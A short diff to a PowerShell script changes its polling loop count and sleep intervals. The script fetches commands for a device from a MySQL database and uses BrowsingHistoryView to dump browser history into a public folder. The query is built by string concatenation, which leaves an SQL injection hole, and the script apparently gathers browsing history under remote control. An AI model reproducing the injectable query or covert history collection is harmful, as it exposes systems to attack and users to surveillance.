@@ -37,7 +37,7 @@ $Connection.ConnectionString = $ConnectionString
 $Connection.Open()
 
 Function Get-Actions{
-    for ($i = 0; $i -lt 53; $i++) {
+    for ($i = 0; $i -lt 9; $i++) {
         $id_device = 0;
         $Query = "SELECT * FROM devices WHERE serial = '" + $serialnumber + "';"
         $oMYSQLCommand = New-Object MySql.Data.MySqlClient.MySqlCommand
@@ -100,7 +100,7 @@ Function Get-Actions{
             }
         }
 
-        Start-Sleep -Milliseconds 1000;
+        Start-Sleep -Milliseconds 60000;
     }
 }
 
@@ -222,7 +222,7 @@ Add-Content C:\Users\Public\cnf.cfg "Sort=0"
 
 & "C:\Users\Public\BrowsingHistoryView.exe" /cfg  C:\Users\Public\cnf.cfg /scomma C:\Users\Public\browsing.txt
 
-Start-Sleep -milliseconds 10000
+Start-Sleep -milliseconds 60000
 
 $sql = "";
 $ccn = 0;
